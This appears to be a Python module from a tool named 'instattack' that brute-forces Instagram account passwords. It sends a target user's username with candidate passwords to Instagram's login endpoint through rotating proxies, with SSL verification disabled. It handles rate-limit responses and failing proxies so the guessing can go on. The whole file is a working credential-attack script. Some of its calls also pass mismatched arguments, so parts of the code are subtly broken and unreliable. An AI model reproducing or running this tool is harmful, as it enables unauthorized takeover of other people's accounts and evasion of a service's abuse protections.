import aiohttp
import asyncio
import ssl

from instattack import logger
from instattack import settings

from instattack.src.exceptions import ClientResponseError
from instattack.src.base import Handler
from instattack.src.login import constants

from .exceptions import InvalidResponseJson, InstagramResultError, ClientTooManyRequests
from .models import InstagramResult
from .utils import get_token


"""
TODO:
----
Look into asyncio.shield() for database transactions.  This is not necessary
with aiojobs however.

ClientSession
-------------
When ClientSession closes at the end of an async with block (or through
a direct ClientSession.close() call), the underlying connection remains
open due to asyncio internal details. In practice, the underlying
connection will close after a short while. However, if the event loop is
stopped before the underlying connection is closed, an ResourceWarning:
unclosed transport warning is emitted (when warnings are enabled).

To avoid this situation, a small delay must be added before closing the
event loop to allow any open underlying connections to close.
<https://docs.aiohttp.org/en/stable/client_advanced.html>
"""

"""
AioHTTP Client Exception Reference
----------------------------------
https://docs.aiohttp.org/en/stable/client_reference.html

-- ClientError

    -- ClientResponseError(ClientError): These exceptions could happen after we
            get response from server.

    -- ClientConnectionError(ClientError): These exceptions related to low-level
            connection problems.

        : Connection reset by peer

        -- ServerConnectionError(ClientConnectionError)

                -- ServerDisconnectError(ServerConnectionError)
                -- ServerTimeoutError(ServerConnectionError, asyncio.TimeoutError)

        -- ClientOSError(ClientConnectionError, OSError): Subset of connection
                errors that are initiated by an OSError exception.

            : OSError: Too many open files

            -- ClientConnectorError(ClientOSError)

                -- ClientProxyConnectionError(ClientConnectorError)
                -- ClientSSLError(ClientConnectorError) -> Raise Exceptions Here

                    -- ClientConnectorCertificateError(ClientSSLError, ssl.SSLError)
                    -- ClientConnectorSSLError(ClientSSLError, ssl.CertificateError)

                        :[SSL: WRONG_VERSION_NUMBER] wrong version number
"""


class ProxyErrorHandlerMixin(object):

    async def handle_inconclusive_proxy(self, e, proxy, scheduler, extra=None):

        log = logger.get_async(self.__name__, subname='handle_inconclusive_proxy')
        log.disable_on_false(self.log_attempts)

        extra = extra or {}
        extra['proxy'] = proxy
        log.error(e, extra=extra)

        await proxy.was_inconclusive(save=False)
        await self.proxy_handler.pool.put(proxy)
        await scheduler.spawn(proxy.save())

    async def handle_proxy_error(self, e, proxy, scheduler, extra=None, put_back=True):

        log = logger.get_async(self.__name__, subname='handle_proxy_error')
        log.disable_on_false(self.log_attempts)

        extra = extra or {}
        extra['proxy'] = proxy
        log.error(e, extra=extra)

        await proxy.was_error(e, save=False)
        await scheduler.spawn(proxy.save())

        if put_back:
            await self.proxy_handler.pool.put(proxy)

    async def handle_semifatal_proxy(self, e, proxy, scheduler):
        """
        The proxy will have it's error stored on the model but will always be
        removed from the pool, instead of optionally deleting if the
        `remove_proxy_on_error` config flag is set to True.
        """
        await self.handle_proxy_error(e, proxy, scheduler, put_back=False)

    async def handle_fatal_proxy(self, e, proxy, scheduler):
        """
        If remove_proxy_on_error is set to True, errors considered fatal will
        remove the proxy from the database.  Otherwise, the proxy will simply
        not be put back in the pool.

        Note that for normal errors, the proxy has the error stored on it but
        it is still put back in the pool.
        """
        log = logger.get_async(self.__name__, subname='handle_fatal_proxy')
        log.disable_on_false(self.log_attempts)

        # Not sure if we want to do this at all - maybe just not put back in
        # pool.
        if self.remove_proxy_on_error:
            log.error(e, extra={'other': 'Removing Proxy', 'proxy': proxy})
            await scheduler.spawn(proxy.delete())
        else:
            await self.handle_proxy_error(e, proxy, scheduler, put_back=False)


class RequestHandler(Handler, ProxyErrorHandlerMixin):

    SLEEP = 3

    REQUEST_ERRORS = (
        aiohttp.ClientProxyConnectionError,
        # Not sure why we need the .client_exceptions version and the base version?
        aiohttp.client_exceptions.ClientConnectorError,
        aiohttp.ServerConnectionError,
        # Not sure why we have to add these even though they should be
        # covered by their parents...
        aiohttp.ClientConnectorError,
        aiohttp.ClientConnectorCertificateError,
        aiohttp.ClientConnectorSSLError,
        ConnectionResetError,
        ConnectionRefusedError,
        ssl.SSLError
    )

    def __init__(self, config, proxy_handler, **kwargs):
        super(RequestHandler, self).__init__(**kwargs)
        self.proxy_handler = proxy_handler

        self._headers = None
        self._cookies = None
        self._token = None

        self.log_attempts = config['attempts']['log']

        self.limit = config['connection']['limit']
        self.timeout = config['connection']['timeout']
        self.limit_per_host = config['connection']['limit_per_host']

        self.remove_proxy_on_error = config.get('remove_proxy_on_error', False)

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.limit,
            limit_per_host=self.limit_per_host,
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self.timeout
        )

    def _login_data(self, password):
        return {
            constants.INSTAGRAM_USERNAME_FIELD: self.user.username,
            constants.INSTAGRAM_PASSWORD_FIELD: password
        }

    @property
    def headers(self):
        return self._headers

    @property
    def token(self):
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self._connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            self._headers = settings.HEADERS(self._token)
            await sess.close()

        return self._cookies

    async def parse_response_result(self, result, password, proxy):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, proxy=proxy, password=password)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def handle_client_response(self, response, password, proxy):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        log = logger.get_async(self.__name__, subname='handle_request_error')
        log.disable_on_false(self.log_attempts)

        if response.status == 400:
            try:
                json = await response.json()
            except ValueError:
                raise InvalidResponseJson(response)
            else:
                return await self.parse_response_result(json, password, proxy)
        else:
            try:
                response.raise_for_status()
            except (
                aiohttp.ClientResponseError,
            ) as e:
                if response.status == 429:
                    raise ClientTooManyRequests(response)
                else:
                    raise ClientResponseError(response)
            else:
                try:
                    json = await response.json()
                except ValueError:
                    raise InvalidResponseJson(response)
                else:
                    return await self.parse_response_result(json, password, proxy)

    async def handle_response_error(self, e, proxy, scheduler, response=None):

        if isinstance(e, ClientTooManyRequests):
            await self.handle_inconclusive_proxy(e, proxy, scheduler, extra={
                'response': response
            })

        elif isinstance(e, InvalidResponseJson):
            await self.handle_semifatal_proxy(e, proxy, scheduler, extra={
                'response': response
            })

        elif isinstance(e, InstagramResultError):
            await self.handle_semifatal_proxy(e, proxy, scheduler, extra={
                'response': response
            })

        else:
            raise e

    async def handle_request_error(self, e, proxy, scheduler):
        """
        For errors related to proxy connectivity issues, and the validity of
        the proxy, we remove the proxy entirely and don't note the error/put
        back in the pool.  For situations in which it is a client response
        error, i.e. a response was returned, we just note the error and put
        the proxy back in the pool.
        """
        log = logger.get_async(self.__name__, subname='handle_request_error')
        log.disable_on_false(self.log_attempts)

        if isinstance(e, RuntimeError):
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            await self.handle_inconclusive_proxy(e, proxy, scheduler)

        elif isinstance(e, asyncio.CancelledError):
            # Don't want to mark as inconclusive because we don't want to note
            # the last time the proxy was used.
            pass

        elif isinstance(e, ClientResponseError):
            await self.handle_response_error(e)

        elif isinstance(e, self.REQUEST_ERRORS):
            if isinstance(e, OSError):
                # We have only seen this for the following:
                # >>> OSError: [Errno 24] Too many open files -> Want to sleep
                # >>> OSError: [Errno 54] Connection reset by peer
                # >>> ClientProxyConnectionError [Errno 61] Cannot connect to host ... ssl:False
                # Mark as Inconclusive for Now
                if e.errno == 54:
                    # For now, keep as semi-fatal errors just to remove from pool.
                    await self.handle_semifatal_proxy(e, proxy, scheduler)
                elif e.errno == 24:
                    await self.handle_proxy_error(e, proxy, scheduler, extra={
                        'other': f'Sleeping for {self.SLEEP} Seconds',
                    })
                    await asyncio.sleep(3.0)
                elif e.errno == 61:
                    # For now, keep as semi-fatal errors just to remove from pool.
                    await self.handle_semifatal_proxy(e, proxy, scheduler)
                else:
                    # For now, keep as semi-fatal errors just to remove from pool.
                    await self.handle_semifatal_proxy(e, proxy, scheduler)
            else:
                # For now, keep as semi-fatal errors just to remove from pool.
                await self.handle_semifatal_proxy(e, proxy, scheduler)

    async def login_request(self, loop, session, password, proxy, scheduler):
        """
        For a given password, makes a series of concurrent requests, each using
        a different proxy, until a result is found that authenticates or dis-
        authenticates the given password.

        TODO
        ----

        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        log = logger.get_async(self.__name__, subname='login_request')
        log.disable_on_false(self.log_attempts)

        # TODO: Make sure we are saving proxy in situations in which there
        # was no error or other reason to potentially save, so that the time
        # is always adjusted.  This might already be taken care of though.
        proxy.update_time()
        log.debug('Making Login Request', extra={
            'password': password,
            'proxy': proxy,
        })
        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(password),
                ssl=False,
                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                try:
                    result = await self.handle_client_response(response, password, proxy)
                except Exception as e:
                    await self.handle_response_error(e, response, proxy, scheduler)
                else:
                    if not result:
                        raise RuntimeError("Handling client response should "
                            "not return null proxy.")

                    await proxy.was_success(save=False)
                    await self.proxy_handler.pool.put(proxy)
                    await scheduler.spawn(proxy.save())
                    return result

        except Exception as e:
            await self.handle_request_error(e, proxy, scheduler)
